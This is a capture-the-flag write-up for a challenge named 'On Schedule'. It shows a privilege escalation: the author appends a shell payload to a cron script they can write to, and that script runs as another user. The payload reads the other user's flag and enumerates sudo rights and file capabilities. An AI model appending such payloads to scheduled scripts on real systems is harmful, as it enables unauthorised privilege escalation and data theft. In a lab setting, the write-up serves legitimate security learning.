# On Schedule — Hostbusters (200 pts)

gh0st404 maintains a nightly collector script on charon. Somebody else's account runs it on a schedule. Use that to become the next user.

## How I solved it

Recon as gh0st404:

```
ls -la /opt/scrape/
# collect.sh — owned/WRITABLE by gh0st404
# comment: "nightly collector maintained by gh0st404, RUN BY sunstalker via cron"

/etc/cron.d/charon-collect:
* * * * * sunstalker /opt/scrape/collect.sh
```

There it is: gh0st404 can edit a script that cron executes **as sunstalker** every minute. Append a payload:

```bash
echo 'cat /home/sunstalker/flag.txt > /tmp/out 2>&1; id >> /tmp/out; \
      sudo -n -l >> /tmp/out 2>&1; getcap -r / >> /tmp/out 2>&1; chmod 666 /tmp/out' \
    >> /opt/scrape/collect.sh
```

Wait for the next minute boundary, read `/tmp/out`. The cron carried my payload — flag plus recon for the next two challenges in one shot (sunstalker's sudoers entry and the getcap list).

**Ops gotcha:** the nginx websocket proxy for the web shell kills idle connections (~60s), which resets the disposable box before cron fires. Keep the session alive with a watch loop printing a tick every few seconds while waiting for the minute to roll over.

## Flag

```
deadface{cr0n_c4rr13d_my_p4yl04d}
```
